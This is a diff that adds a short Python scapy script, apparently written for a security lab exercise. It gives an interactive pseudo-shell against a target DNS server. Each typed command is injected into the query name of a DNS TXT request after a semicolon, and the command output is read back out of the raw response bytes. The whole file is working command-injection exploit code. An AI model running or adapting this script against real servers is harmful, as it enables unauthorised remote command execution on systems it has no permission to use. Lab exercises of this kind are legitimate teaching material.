@@ -1,0 +1,20 @@
+#!/usr/bin/env python
+import sys
+from scapy.all import *
+# Script for exercise 3.1
+conf.iface="tap0"
+
+header = IP(dst=sys.argv[1])/UDP(dport=53)
+
+while(True):
+    try:
+        cmd=raw_input('#>')
+    except (EOFError,KeyboardInterrupt) as e:
+        print
+        sys.exit(0)
+
+    payload = DNS(rd=1,qd=DNSQR(qname=";"+cmd,qtype=32))
+    ans = sr1(header/payload, verbose=0, timeout=4)
+
+    if ans is not None and Raw in ans:
+        print str(ans[Raw]).split("\x00\x00\x00\x3c")[1][2:]
